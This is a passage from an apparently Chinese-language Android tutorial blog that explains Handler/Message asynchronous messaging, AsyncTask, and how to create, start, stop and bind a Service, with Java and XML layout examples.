class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> UPDATE_TEXT = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> TextView text;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Handler handler = <span class="keyword">new</span> Handler(<span class="keyword">new</span> Handler.Callback()&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span>  <span class="title">handleMessage</span><span class="params">(Message msg)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">switch</span> (msg.what) &#123;</span><br><span class="line">                <span class="keyword">case</span> UPDATE_TEXT:</span><br><span class="line">                    text.setText(<span class="string">"Nice to meet you"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        text = (TextView) findViewById(R.id.text);</span><br><span class="line">        Button changeText = (Button) findViewById(R.id.change_text);</span><br><span class="line">        changeText.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(v.getId())&#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.change_text:</span><br><span class="line">                <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                        Message message = <span class="keyword">new</span> Message();</span><br><span class="line">                        message.what = UPDATE_TEXT;</span><br><span class="line">                        handler.sendMessage(message);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).start();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按下按钮后，子线程创建了一个Message对象，赋值后调用Handler的sendMessage()方法将其发出去。然后Handler收到这条Message并在handleMessage()方法中进行处理。</p><h3 id="解析异步消息处理机制"><a href="#解析异步消息处理机制" class="headerlink" title="解析异步消息处理机制"></a>解析异步消息处理机制</h3><p>Android的异步消息处理主要由4个部分组成：Message、Handle、MessageQueue、Looper。</p><h4 id="Message"><a href="#Message" class="headerlink" title="Message"></a>Message</h4><p>用于在线程之间传递消息，可以在内部携带少量的信息，用于在不同线程之间交换数据。除了what字段，还有两个整型字段arg1和arg2，以及一个Object对象字段obj。</p><h4 id="Handle"><a href="#Handle" class="headerlink" title="Handle"></a>Handle</h4><p>主要用于发送和处理消息。发送消息的一般是Handler的sendMessage()方法，而发出的消息经过一系列辗转处理后，最终会传递到Handler的handleMessage()方法中。</p><h4 id="MessageQueue"><a href="#MessageQueue" class="headerlink" title="MessageQueue"></a>MessageQueue</h4><p>消息队列，主要用于存放所有通过Handler发送的消息，这部分消息会一直存在于消息队列中，等待被处理。每个线程中只会有一个MessageQueue对象。</p><h4 id="Looper"><a href="#Looper" class="headerlink" title="Looper"></a>Looper</h4><p>每个线程中的MessageQueue管家，调用Looper的lopp()方法后，就会进入无限循环中，每当发现MessageQueue中存在一条消息，就会将它取出，并传递到Handler的handleMessage()方法中。每个线程也只会有一个Looper对象。</p><p><img src="./day8/1.png" alt=""></p><p>之前使用到的runOnUiThread()方法其实就是一个异步消息处理机制的接口封装。</p><h3 id="使用AsyncTask"><a href="#使用AsyncTask" class="headerlink" title="使用AsyncTask"></a>使用AsyncTask</h3><p>AsyncTask是一个抽象类。在继承时可以指定3个泛型参数，其用途如下：</p><ul><li>Params: 在执行AsyncTask时需要传入的参数，可用于在后台任务中使用。</li><li>Progress：后头任务执行时，如果需要在界面上显示当前进度，则使用这里指定的泛型作为进度单位。</li><li>Result：当任务执行完毕后，如果需要对结果进行返回，则使用这里指定的泛型作为返回值类型。</li></ul><p>AsyncTask一般来说需要重写的方法用以下几个：</p><ul><li>onPreExecute():这个方法会在后台任务开始执行之前调用，用于进行界面的初始化。</li><li>doInBackground(Params…)：这个方法中的所有代码都会在子线程中运行。如果需要更新UI元素，可以调用publishProgress(Progress…)方法来完成。</li><li>onProgressUpdate(Progress…)：在后台任务中调用了publishProgress(Progress…)方法后，onProgressUpdate(Progress…)方法很快就会被调用，在这个方法中可以对UI进行操作。</li><li>onPostExecute(Result)：当后台任务执行完毕并通过return语句进行返回时，这个方法就很快会被调用。</li></ul><p>假设定义了一个DownloadTask类继承自AsyncTask，那么完成构造后只需以下代码即可启动：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> DownloadTask().execute();</span><br></pre></td></tr></table></figure><h2 id="服务的基本用法"><a href="#服务的基本用法" class="headerlink" title="服务的基本用法"></a>服务的基本用法</h2><h3 id="定义一个服务"><a href="#定义一个服务" class="headerlink" title="定义一个服务"></a>定义一个服务</h3><p>新建一个ServiceTest项目，然后右键点击com.example.servicetest-&gt;New-&gt;Service-&gt;Service，将服务命名为MyService。修改MyService代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(<span class="string">"Not yet implemented"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中onCrete()方法会在服务创建的时候调用，onStartCommand()方法会在每次服务启动的时候调用，onDestroy()方法会在服务销毁的时候调用。</p><h3 id="启动和停止服务"><a href="#启动和停止服务" class="headerlink" title="启动和停止服务"></a>启动和停止服务</h3><p>修改布局文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/start_service"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Start Service"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/stop_service"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Stop Service"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改MainActivity代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button startService = (Button) findViewById(R.id.start_service);</span><br><span class="line">        startService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button stopService = (Button) findViewById(R.id.stop_service);</span><br><span class="line">        stopService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId())&#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.start_service:</span><br><span class="line">                Intent startIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startService(startIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.stop_service:</span><br><span class="line">                Intent stopIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                stopService(stopIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在服务中添加打印日志：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(<span class="string">"Not yet implemented"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onCreate execute"</span>);</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onStartCommand execute"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onDestroy execute"</span>);</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行后，点击Start Service，可以发现onCreate和onStartCommand()方法都执行了，并且还可以在Setting-&gt;Developer options-&gt;Running services中找到它。然后点击Stop Service服务就会停止了。</p><p>另外，onCreate()方法是服务第一次创建时调用的，而onStartCommand()方法则在每次服务启动的时候都会调用。</p><h3 id="活动和服务进行通信"><a href="#活动和服务进行通信" class="headerlink" title="活动和服务进行通信"></a>活动和服务进行通信</h3><p>修改Myservice代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  DownloadBinder mBinder = <span class="keyword">new</span> DownloadBinder();</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DownloadBinder</span> <span class="keyword">extends</span> <span class="title">Binder</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDownload</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">"Myservice"</span>,<span class="string">"startDownload execute"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getProgress</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">"Myservice"</span>,<span class="string">"getProgress execute"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mBinder;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onCreate execute"</span>);</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onStartCommand execute"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onDestroy execute"</span>);</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改布局文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/start_service"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Start Service"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/stop_service"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Stop Service"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/bind_service"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Bind Service"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/unbind_service"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Unbind Service"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改MainActivity代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MyService.DownloadBinder downloadBinder;</span><br><span class="line">    <span class="keyword">private</span> ServiceConnection connection = <span class="keyword">new</span> ServiceConnection() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> </span>&#123;</span><br><span class="line">            downloadBinder = (MyService.DownloadBinder) service;</span><br><span class="line">            downloadBinder.startDownload();</span><br><span class="line">            downloadBinder.getProgress();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceDisconnected</span><span class="params">(ComponentName name)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button startService = (Button) findViewById(R.id.start_service);</span><br><span class="line">        startService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button stopService = (Button) findViewById(R.id.stop_service);</span><br><span class="line">        stopService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button bindService = (Button) findViewById(R.id.bind_service);</span><br><span class="line">        bindService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button unbindService = (Button) findViewById(R.id.unbind_service);</span><br><span class="line">        unbindService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId())&#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.start_service:</span><br><span class="line">                Intent startIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startService(startIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.stop_service:</span><br><span class="line">                Intent stopIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                stopService(stopIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.bind_service:</span><br><span class="line">                Intent bindIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                bindService(bindIntent, connection, BIND_AUTO_CREATE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.unbind_service:</span><br><span class="line">                unbindService(connection);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，onServiceConnected()方法会在活动与服务绑定成功时调用，onServiceDisconnected()方法会在活动与服务解绑时调用。</p><p>bindService()方法将MainActivity进行绑定，其中第一个参数是Intent对象，第二个参数是前面的 